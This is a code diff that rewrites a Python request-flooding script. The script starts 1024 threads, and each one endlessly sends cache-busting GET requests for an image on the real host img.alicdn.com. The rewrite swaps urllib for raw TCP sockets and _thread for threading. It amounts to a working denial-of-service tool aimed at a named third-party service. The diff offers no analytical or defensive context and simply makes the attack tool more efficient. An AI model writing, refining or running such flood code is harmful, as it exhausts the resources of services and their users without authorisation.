@@ -1,19 +1,25 @@
-import urllib.request
-import _thread
+import socket
+import threading
 import random
 
-def send():
+def send_request():
     while True:
         try:
-            pic = urllib.request.urlopen('https://img.alicdn.com/imgextra/i1/O1CN01xA4P9S1JsW2WEg0e1_!!6000000001084-2-tps-2880-560.png?{}'.format(str(ranom.random())))
-            del pic
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.connect(('img.alicdn.com', 80))
+            request = b'GET /imgextra/i1/O1CN01xA4P9S1JsW2WEg0e1_!!6000000001084-2-tps-2880-560.png?' + str(random.random()).encode() + b' HTTP/1.1\r\nHost: img.alicdn.com\r\nConnection: close\r\n\r\n'
+            sock.sendall(request)
+            response = sock.recv(1024)
+            sock.close()
         except:
-            send()
+            send_request()
 
 def main():
     for i in range(1024):
         try:
-            _thread.start_new(send, ())
+            thread = threading.Thread(target=send_request)
+            thread.start()
         except Exception as e:
             print(e)
 
